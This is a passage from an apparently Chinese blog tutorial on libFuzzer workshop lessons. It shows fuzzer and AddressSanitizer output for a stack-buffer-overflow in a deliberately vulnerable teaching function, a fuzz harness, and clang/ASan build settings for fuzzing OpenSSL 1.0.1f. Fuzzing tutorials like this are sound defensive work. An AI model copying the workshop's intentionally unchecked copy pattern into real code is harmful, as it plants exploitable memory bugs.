class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">INFO: Seed: <span class="number">296692635</span></span><br><span class="line">INFO: Loaded <span class="number">1</span> modules   (<span class="number">37</span> inline <span class="number">8</span>-bit counters): <span class="number">37</span> [<span class="number">0x7f8160</span>, <span class="number">0x7f8185</span>), </span><br><span class="line">INFO: Loaded <span class="number">1</span> PC tables (<span class="number">37</span> PCs): <span class="number">37</span> [<span class="number">0x5b7d00</span>,<span class="number">0x5b7f50</span>), </span><br><span class="line">INFO:        <span class="number">0</span> files found in corpus2</span><br><span class="line">INFO: -max_len is not provided; libFuzzer will not generate inputs larger than <span class="number">4096</span> bytes</span><br><span class="line">INFO: A corpus is not provided, starting from an empty corpus</span><br><span class="line">#<span class="number">2</span>INITED cov: <span class="number">5</span> ft: <span class="number">6</span> corp: <span class="number">1</span>/<span class="number">1</span>b exec/s: <span class="number">0</span> rss: <span class="number">27</span>Mb</span><br><span class="line">#<span class="number">414</span>NEW    cov: <span class="number">6</span> ft: <span class="number">7</span> corp: <span class="number">2</span>/<span class="number">9</span>b lim: <span class="number">8</span> exec/s: <span class="number">0</span> rss: <span class="number">27</span>Mb L: <span class="number">8</span>/<span class="number">8</span> MS: <span class="number">2</span> ChangeByte-CrossOver-</span><br><span class="line">NEW_FUNC[<span class="number">1</span>/<span class="number">13</span>]: <span class="number">0x59bab0</span> in unsigned char* std::<span class="built_in">copy</span>&lt;unsigned char <span class="keyword">const</span>*, unsigned char*&gt;(unsigned char <span class="keyword">const</span>*, unsigned char <span class="keyword">const</span>*, unsigned char*) /usr/lib/gcc/x86_64-linux-gnu/<span class="number">7.5</span><span class="number">.0</span>/../../../../include/c++/<span class="number">7.5</span><span class="number">.0</span>/bits/stl_algobase.h:<span class="number">447</span></span><br><span class="line">NEW_FUNC[<span class="number">2</span>/<span class="number">13</span>]: <span class="number">0x59bb40</span> in std::array&lt;unsigned char, <span class="number">1016</span>ul&gt;::data() /usr/lib/gcc/x86_64-linux-gnu/<span class="number">7.5</span><span class="number">.0</span>/../../../../include/c++/<span class="number">7.5</span><span class="number">.0</span>/array:<span class="number">235</span></span><br><span class="line">#<span class="number">584</span>NEW    cov: <span class="number">24</span> ft: <span class="number">26</span> corp: <span class="number">3</span>/<span class="number">17</span>b lim: <span class="number">8</span> exec/s: <span class="number">0</span> rss: <span class="number">28</span>Mb L: <span class="number">8</span>/<span class="number">8</span> MS: <span class="number">5</span> CopyPart-CopyPart-ShuffleBytes-CrossOver-CMP- DE: <span class="string">&quot;ZN_2016&quot;</span>-</span><br><span class="line">#<span class="number">105505</span>NEW    cov: <span class="number">25</span> ft: <span class="number">27</span> corp: <span class="number">4</span>/<span class="number">1067</span>b lim: <span class="number">1050</span> exec/s: <span class="number">0</span> rss: <span class="number">47</span>Mb L: <span class="number">1050</span>/<span class="number">1050</span> MS: <span class="number">1</span> CrossOver-</span><br><span class="line">#<span class="number">106508</span>REDUCE cov: <span class="number">25</span> ft: <span class="number">27</span> corp: <span class="number">4</span>/<span class="number">1046</span>b lim: <span class="number">1050</span> exec/s: <span class="number">0</span> rss: <span class="number">48</span>Mb L: <span class="number">1029</span>/<span class="number">1029</span> MS: <span class="number">3</span> EraseBytes-ChangeBit-CopyPart-</span><br><span class="line">#<span class="number">108257</span>REDUCE cov: <span class="number">25</span> ft: <span class="number">27</span> corp: <span class="number">4</span>/<span class="number">1043</span>b lim: <span class="number">1060</span> exec/s: <span class="number">0</span> rss: <span class="number">49</span>Mb L: <span class="number">1026</span>/<span class="number">1026</span> MS: <span class="number">4</span> ChangeByte-ChangeByte-CrossOver-InsertRepeatedBytes-</span><br><span class="line">=================================================================</span><br><span class="line">==<span class="number">10468</span>==ERROR: AddressSanitizer: stack-buffer-overflow on address <span class="number">0x7fff31422548</span> at pc <span class="number">0x00000055286d</span> bp <span class="number">0x7fff31421f90</span> sp <span class="number">0x7fff31421740</span></span><br><span class="line">WRITE of size <span class="number">1023</span> at <span class="number">0x7fff31422548</span> thread T0</span><br><span class="line">    #<span class="number">0</span> <span class="number">0x55286c</span> in __asan_memmove /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cpp:<span class="number">30</span></span><br><span class="line">    #<span class="number">1</span> <span class="number">0x59c238</span> in unsigned char* std::__copy_move&lt;<span class="literal">false</span>, <span class="literal">true</span>, std::random_access_iterator_tag&gt;::__copy_m&lt;unsigned char&gt;(unsigned char <span class="keyword">const</span>*, unsigned char <span class="keyword">const</span>*, unsigned char*) /usr/lib/gcc/x86_64-linux-gnu/<span class="number">7.5</span><span class="number">.0</span>/../../../../include/c++/<span class="number">7.5</span><span class="number">.0</span>/bits/stl_algobase.h:<span class="number">368</span>:<span class="number">6</span></span><br><span class="line">    #<span class="number">2</span> <span class="number">0x59c158</span> in unsigned char* std::__copy_move_a&lt;<span class="literal">false</span>, unsigned char <span class="keyword">const</span>*, unsigned char*&gt;(unsigned char <span class="keyword">const</span>*, unsigned char <span class="keyword">const</span>*, unsigned char*) /usr/lib/gcc/x86_64-linux-gnu/<span class="number">7.5</span><span class="number">.0</span>/../../../../include/c++/<span class="number">7.5</span><span class="number">.0</span>/bits/stl_algobase.h:<span class="number">385</span>:<span class="number">14</span></span><br><span class="line">    #<span class="number">3</span> <span class="number">0x59c0b6</span> in unsigned char* std::__copy_move_a2&lt;<span class="literal">false</span>, unsigned char <span class="keyword">const</span>*, unsigned char*&gt;(unsigned char <span class="keyword">const</span>*, unsigned char <span class="keyword">const</span>*, unsigned char*) /usr/lib/gcc/x86_64-linux-gnu/<span class="number">7.5</span><span class="number">.0</span>/../../../../include/c++/<span class="number">7.5</span><span class="number">.0</span>/bits/stl_algobase.h:<span class="number">422</span>:<span class="number">18</span></span><br><span class="line">    #<span class="number">4</span> <span class="number">0x59bb39</span> in unsigned char* std::<span class="built_in">copy</span>&lt;unsigned char <span class="keyword">const</span>*, unsigned char*&gt;(unsigned char <span class="keyword">const</span>*, unsigned char <span class="keyword">const</span>*, unsigned char*) /usr/lib/gcc/x86_64-linux-gnu/<span class="number">7.5</span><span class="number">.0</span>/../../../../include/c++/<span class="number">7.5</span><span class="number">.0</span>/bits/stl_algobase.h:<span class="number">454</span>:<span class="number">15</span></span><br><span class="line">    #<span class="number">5</span> <span class="number">0x59b8b5</span> in VulnerableFunction2(unsigned char <span class="keyword">const</span>*, unsigned long, <span class="type">bool</span>) /home/admin/libfuzzer-workshop/lessons/<span class="number">04</span>/./vulnerable_functions.h:<span class="number">61</span>:<span class="number">3</span></span><br><span class="line">    #<span class="number">6</span> <span class="number">0x59bf63</span> in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/<span class="number">04</span>/second_fuzzer.cc:<span class="number">12</span>:<span class="number">2</span></span><br><span class="line">    #<span class="number">7</span> <span class="number">0x466186</span> in fuzzer::Fuzzer::ExecuteCallback(unsigned char <span class="keyword">const</span>*, unsigned long) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">556</span></span><br><span class="line">    #<span class="number">8</span> <span class="number">0x46b7e9</span> in fuzzer::Fuzzer::RunOne(unsigned char <span class="keyword">const</span>*, unsigned long, <span class="type">bool</span>, fuzzer::InputInfo*, <span class="type">bool</span>*) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">470</span></span><br><span class="line">    #<span class="number">9</span> <span class="number">0x46b7e9</span> in fuzzer::Fuzzer::MutateAndTestOne() /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">699</span></span><br><span class="line">    #<span class="number">10</span> <span class="number">0x46e80f</span> in fuzzer::Fuzzer::Loop(std::Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:<span class="number">830</span></span><br><span class="line">    #<span class="number">11</span> <span class="number">0x456b99</span> in fuzzer::FuzzerDriver(<span class="type">int</span>*, char***, <span class="type">int</span> (*)(unsigned char <span class="keyword">const</span>*, unsigned long)) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:<span class="number">824</span></span><br><span class="line">    #<span class="number">12</span> <span class="number">0x41f522</span> in main /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerMain.cpp:<span class="number">19</span></span><br><span class="line">    #<span class="number">13</span> <span class="number">0x7fd1b4bf6bf6</span> in __libc_start_main (/lib/x86_64-linux-gnu/libc.so<span class="number">.6</span>+<span class="number">0x21bf6</span>)</span><br><span class="line">    #<span class="number">14</span> <span class="number">0x41f599</span> in _start (/home/admin/libfuzzer-workshop/lessons/<span class="number">04</span>/second_fuzzer+<span class="number">0x41f599</span>)</span><br><span class="line"></span><br><span class="line">Address <span class="number">0x7fff31422548</span> is located in stack of thread T0 at offset <span class="number">1128</span> in frame</span><br><span class="line">    #<span class="number">0</span> <span class="number">0x59b4af</span> in VulnerableFunction2(unsigned char <span class="keyword">const</span>*, unsigned long, <span class="type">bool</span>) /home/admin/libfuzzer-workshop/lessons/<span class="number">04</span>/./vulnerable_functions.h:<span class="number">42</span></span><br><span class="line"></span><br><span class="line">  This frame has <span class="number">3</span> object(s):</span><br><span class="line">    [<span class="number">32</span>, <span class="number">64</span>) <span class="string">&#x27;header&#x27;</span> (line <span class="number">46</span>)</span><br><span class="line">    [<span class="number">96</span>, <span class="number">97</span>) <span class="string">&#x27;ref.tmp&#x27;</span> (line <span class="number">46</span>)</span><br><span class="line">    [<span class="number">112</span>, <span class="number">1128</span>) <span class="string">&#x27;body&#x27;</span> (line <span class="number">48</span>) &lt;== Memory access at offset <span class="number">1128</span> overflows this variable</span><br><span class="line">HINT: this may be a <span class="literal">false</span> positive <span class="keyword">if</span> your program uses some custom stack unwind mechanism, swapcontext or vfork</span><br><span class="line">      (longjmp and C++ exceptions *are* supported)</span><br><span class="line">SUMMARY: AddressSanitizer: stack-buffer-overflow /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/asan/asan_interceptors_memintrinsics.cpp:<span class="number">30</span> in __asan_memmove</span><br><span class="line">Shadow bytes around the buggy address:</span><br><span class="line">  <span class="number">0x10006627c450</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x10006627c460</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x10006627c470</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x10006627c480</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x10006627c490</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">=&gt;<span class="number">0x10006627c4a0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>[f3]f3 f3 f3 f3 f3 f3</span><br><span class="line">  <span class="number">0x10006627c4b0</span>: f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 f3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x10006627c4c0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x10006627c4d0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x10006627c4e0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> f1 f1 f1 f1 <span class="number">02</span> f3 f3 f3 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">  <span class="number">0x10006627c4f0</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">Shadow <span class="type">byte</span> legend (one shadow <span class="type">byte</span> represents <span class="number">8</span> application bytes):</span><br><span class="line">  Addressable:           <span class="number">00</span></span><br><span class="line">  Partially addressable: <span class="number">01</span> <span class="number">02</span> <span class="number">03</span> <span class="number">04</span> <span class="number">05</span> <span class="number">06</span> <span class="number">07</span> </span><br><span class="line">  Heap left redzone:       fa</span><br><span class="line">  Freed heap region:       fd</span><br><span class="line">  Stack left redzone:      f1</span><br><span class="line">  Stack mid redzone:       f2</span><br><span class="line">  Stack right redzone:     f3</span><br><span class="line">  Stack after <span class="keyword">return</span>:      f5</span><br><span class="line">  Stack use after scope:   f8</span><br><span class="line">  Global redzone:          f9</span><br><span class="line">  Global init order:       f6</span><br><span class="line">  Poisoned by user:        f7</span><br><span class="line">  Container overflow:      fc</span><br><span class="line">  Array cookie:            ac</span><br><span class="line">  Intra object redzone:    bb</span><br><span class="line">  ASan internal:           fe</span><br><span class="line">  Left alloca redzone:     ca</span><br><span class="line">  Right alloca redzone:    cb</span><br><span class="line">  Shadow gap:              cc</span><br><span class="line">==<span class="number">10468</span>==ABORTING</span><br><span class="line">MS: <span class="number">4</span> ChangeBinInt-CrossOver-ChangeByte-EraseBytes-; base unit: e63bf1b07c6950248bb14fe74c3a84f06c711b15</span><br><span class="line">artifact_prefix=<span class="string">&#x27;./&#x27;</span>; Test unit written to ./crash-a42cbe2ff7331f281ef213e54919e8cd932883bd</span><br></pre></td></tr></table></figure><p>相信大家已经不再陌生了，定位错误位于<code>#5 0x59b8b5 in VulnerableFunction2(unsigned char const*, unsigned long, bool) /home/admin/libfuzzer-workshop/lessons/04/./vulnerable_functions.h:61:3</code><br>即<code>  std::copy(data, data + size, body.data());</code>，该句造成了stack_overflow，原因在于vector类型的body的大小为1024 - sizeof(kMagicHeader)，而在copy时的data的size的限制条件是<code>size &gt; kMaxPacketLen(1024)</code>，从而造成了缓冲区溢出。</p><p>如果我们写死flag为false的话就可能会跑很久，也跑不出来crash。因此，我们在套用模板时要结合函数的逻辑，使得fuzz的接口设计的更加合理，从而增加fuzz的效率。</p><p>继续继续VulnerableFunction3:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">constexpr <span class="built_in">std</span>::<span class="type">size_t</span> kZn2016VerifyHashFlag = <span class="number">0x0001000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">VulnerableFunction3</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span>* data, <span class="type">size_t</span> size, <span class="built_in">std</span>::<span class="type">size_t</span> flags)</span> &#123;</span><br><span class="line">  <span class="type">bool</span> verify_hash = flags &amp; kZn2016VerifyHashFlag;</span><br><span class="line">  <span class="keyword">return</span> VulnerableFunction2(data, size, verify_hash);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，与2不同的地方就是对flag进行了&amp; kZn2016VerifyHashFlag的计算，这种其实我们可以计算出使得<code>flags &amp; kZn2016VerifyHashFlag</code>为true&#x2F;false的输入，并模仿second_fuzzer那样写个循环，这样就和2没差了。<br>但这里workshop提供了一个不同的方法：<code>In this case, we can get some randomization of flags values using data provided by libFuzzer:</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;vulnerable_functions.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;functional&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">int</span> <span class="title function_">LLVMFuzzerTestOneInput</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *data, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span> <span class="title function_">data_string</span><span class="params">(reinterpret_cast&lt;<span class="type">const</span> <span class="type">char</span>*&gt;(data), size)</span>;</span><br><span class="line">  <span class="keyword">auto</span> data_hash = <span class="built_in">std</span>::hash&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt;()(data_string);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::<span class="type">size_t</span> flags = static_cast&lt;<span class="type">size_t</span>&gt;(data_hash);</span><br><span class="line">  VulnerableFunction3(data, size, flags);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>采用了libfuzzer提供的随机化方法使得我们的输入flag为随机数，从而<code>flags &amp; kZn2016VerifyHashFlag</code>的结果也随机化。在次数足够多的情况下false和true的情况将趋于同为50%。</p><h6 id="接下来看lesson05："><a href="#接下来看lesson05：" class="headerlink" title="接下来看lesson05："></a>接下来看lesson05：</h6><p>这次的目标和lesson04有所不同，lesson04中我们针对.h函数库中的函数进行fuzz，而libfuzzer的威力远不止于此，它还可以对大型开源库进行模糊测试。在源码编译开源库时选择合适的选项以及将libfuzzer与开源库链接在一起以进行fuzz，这些细节将在该lesson05体现。</p><p>首先解包<code>tar xzf openssl1.0.1f.tgz</code>。接着执行<code>./config</code>生成makefile。之后：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make clean</span><br><span class="line">make CC=&quot;clang -O2 -fno-omit-frame-pointer -g -fsanitize=address&quot; -j$(nproc)</span><br></pre></td></tr></table></figure><p>第二条指令其实并不太规范，将编辑器以外的其他参数也一股脑写到CC变量里了。clang后的参数本应该是由CFLAGS或CXXFLAGS指定的。解释一下选项：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-02 指定优先级别</span><br><span class="line">-g 带有调试符号来编译</span><br><span class="line">-fno-omit-frame-pointer 对于不需要栈指针的函数就不在寄存器中保存指针，因此可以忽略存储和检索地址的代码，同时对许多函数提供一个额外的寄存器。所有”-O”级别都打开它，但仅在调试器可以不依靠栈指针运行时才有效。在AMD64平台上此选项默认打开，但是在x86平台上则默认关闭。建议显式的设置它。</span><br><span class="line">-fsanitize 指定sanitize</span><br></pre></td></tr></table></figure><p>这些参数的指定是至关重要的，它会影响到之后开源库与libfuzzer的链接以及fuzz的效率。如果不设置这些编译选项直接make的话fuzz的效率如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="number">05</span> git:(master) ✗ ./openssl_fuzzer2</span><br><span class="line">INFO: Seed: <span class="number">1865248494</span></span><br><span class="line">INFO: Loaded <span class="number">1</span> modules   (<span class="number">10</span> inline <span class="number">8</span>-bit counters): <span class="number">10</span> [<span class="number">0x96c950</span>, <span class="number">0x96c95a</span>), </span><br><span class="line">INFO: Loaded <span class="number">1</span> PC tables (<span class="number">10</span> PCs): <span class="number">10</span> [<span class="number">0x6d56d0</span>,<span class="number">0x6d5770</span>), </span><br><span class="line">INFO: -max_len is not provided; libFuzzer will not generate inputs larger than <span class="number">4096</span> bytes</span><br><span class="line">INFO: A corpus is not provided, starting from an empty corpus</span><br><span class="line">#<span class="number">2</span>INITED cov: <span class="number">2</span> ft: <span class="number">3</span> corp: <span class="number">1</span>/<span class="number">1</span>b exec/s: <span class="number">0</span> rss: <span class="number">29</span>Mb</span><br><span class="line">#<span class="number">131072</span>pulse  cov: <span class="number">2</span> ft: <span class="number">3</span> corp: <span class="number">1</span>/<span class="number">1</span>b lim: <span class="number">1300</span> exec/s: <span class="number">43690</span> rss: <span class="number">388</span>Mb</span><br><span class="line">#<span class="number">262144</span>pulse  cov: <span class="number">2</span> ft: <span class="number">3</span> corp: <span class="number">1</span>/<span class="number">1</span>b lim: <span class="number">2611</span> exec/s: <span class="number">43690</span> rss: <span class="number">397</span>Mb</span><br><span class="line">#<span class="number">524288</span>pulse  cov: <span class="number">2</span> ft: <span class="number">3</span> corp: <span class="number">1</span>/<span class="number">1</span>b lim: <span class="number">4096</span> exec/s: <span class="number">37449</span> rss: <span class="number">411</span>Mb</span><br><span class="line">#<span class="number">1048576</span>pulse  cov: <span class="number">2</span> ft: <span class="number">3</span> corp: <span class="number">1</span>/<span class="number">1</span>b lim: <span class="number">4096</span> exec/s: <span class="number">34952</span> rss: <span class="number">411</span>Mb</span><br><span class="line">#<span class="number">2097152</span>pulse  cov: <span class="number">2</span> ft: <span class="number">3</span> corp: <span class="number">1</span>/<span class="number">1</span>b lim: <span class="number">4096</span> exec/s: <span class="number">32768</span> rss: <span class="number">411</span>Mb</span><br></pre></td></tr></table></figure><p>这路径覆盖率太感人，其中的重要原因就在于编译开源库时的选项设置。<br>设置编译选项后的fuzz效果：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">INFO: Seed: <span class="number">2565779026</span></span><br><span class="line">INFO: Loaded <span class="number">1</span> modules   (<span class="number">35878</span> inline <span class="number">8</span>-bit counters): <span class="number">35878</span> [<span class="number">0xcd8590</span>, <span class="number">0xce11b6</span>), </span><br><span class="line">INFO: Loaded <span class="number">1</span> PC tables (<span class="number">35878</span> PCs): <span class="number">35878</span> [<span class="number">0x954da8</span>,<span class="number">0x9e1008</span>), </span><br><span class="line">INFO: -max_len is not provided; libFuzzer will not generate inputs larger than <span class="number">4096</span> bytes</span><br><span class="line">INFO: A corpus is not provided, starting from an empty corpus</span><br><span class="line">#<span class="number">2</span>INITED cov: <span class="number">410</span> ft: <span class="number">411</span> corp: <span class="number">1</span>/<span class="number">1</span>b exec/s: <span class="number">0</span> rss: <span class="number">36</span>Mb</span><br><span class="line">#<span class="number">112</span>NEW    cov: <span class="number">413</span> ft: <span class="number">416</span> corp: <span class="number">2</span>/<span class="number">2</span>b lim: <span class="number">4</span> exec/s: <span class="number">0</span> rss: <span class="number">42</span>Mb L: <span class="number">1</span>/<span class="number">1</span> MS: <span class="number">5</span> ChangeBit-ChangeBinInt-ChangeByte-InsertByte-EraseBytes-</span><br><span class="line">NEW_FUNC[<span class="number">1</span>/<span class="number">1</span>]: <span class="number">0x65f0a0</span> in ERR_put_error /home/admin/libfuzzer-workshop/lessons/<span class="number">05</span>/openssl1<span class="number">.0</span><span class="number">.1</span>f/crypto/err/err.c:<span class="number">708</span></span><br><span class="line">#<span class="number">319</span>NEW    cov: <span class="number">420</span> ft: <span class="number">448</span> corp: <span class="number">3</span>/<span class="number">8</span>b lim: <span class="number">6</span> exec/s: <span class="number">0</span> rss: <span class="number">51</span>Mb L: <span class="number">6</span>/<span class="number">6</span> MS: <span class="number">2</span> ShuffleBytes-CrossOver-</span><br><span class="line">#<span class="number">327</span>REDUCE cov: <span class="number">420</span> ft: <span class="number">448</span> corp: <span class="number">3</span>/<span class="number">7</span>b lim: <span class="number">6</span> exec/s: <span class="number">0</span> rss: <span class="number">51</span>Mb L: <span class="number">5</span>/<span class="number">5</span> MS: <span class="number">3</span> ChangeByte-EraseBytes-CrossOver-</span><br><span class="line">NEW_FUNC[<span class="number">1</span>/<span class="number">2</span>]: <span class="number">0x562a40</span> in tls1_enc /home/admin/libfuzzer-workshop/lessons/<span class="number">05</span>/openssl1<span class="number">.0</span><span class="number">.1</span>f/ssl/t1_enc.c:<span class="number">685</span></span><br><span class="line">NEW_FUNC[<span class="number">2</span>/<span class="number">2</span>]: <span class="number">0x67e1d0</span> in EVP_MD_CTX_md /home/admin/libfuzzer-workshop/lessons/<span class="number">05</span>/openssl1<span class="number">.0</span><span class="number">.1</span>f/crypto/evp/evp_lib.c:<span class="number">282</span></span><br><span class="line">#<span class="number">454</span>REDUCE cov: <span class="number">431</span> ft: <span class="number">467</span> corp: <span class="number">4</span>/<span class="number">12</span>b lim: <span class="number">6</span> exec/s: <span class="number">0</span> rss: <span class="number">57</span>Mb L: <span class="number">5</span>/<span class="number">5</span> MS: <span class="number">2</span> ShuffleBytes-CMP- DE: <span class="string">&quot;\xfd\x03\x00\x00&quot;</span>-</span><br><span class="line">NEW_FUNC[<span class="number">1</span>/<span class="number">6</span>]: <span class="number">0x5663d0</span> in tls1_alert_code /home/admin/libfuzzer-workshop/lessons/<span class="number">05</span>/openssl1<span class="number">.0</span><span class="number">.1</span>f/ssl/t1_enc.c:<span class="number">1214</span></span><br><span class="line">NEW_FUNC[<span class="number">2</span>/<span class="number">6</span>]: <span class="number">0x5c6560</span> in do_ssl3_write /home/admin/libfuzzer-workshop/lessons/<span class="number">05</span>/openssl1<span class="number">.0</span><span class="number">.1</span>f/ssl/s3_pkt.c:<span class="number">634</span></span><br><span class="line">#<span class="number">470</span>NEW    cov: <span class="number">465</span> ft: <span class="number">514</span> corp: <span class="number">5</span>/<span class="number">17</span>b lim: <span class="number">6</span> exec/s: <span class="number">0</span> rss: <span class="number">58</span>Mb L: <span class="number">5</span>/<span class="number">5</span> MS: <span class="number">1</span> ChangeByte-</span><br><span class="line">#<span class="number">472</span>REDUCE cov: 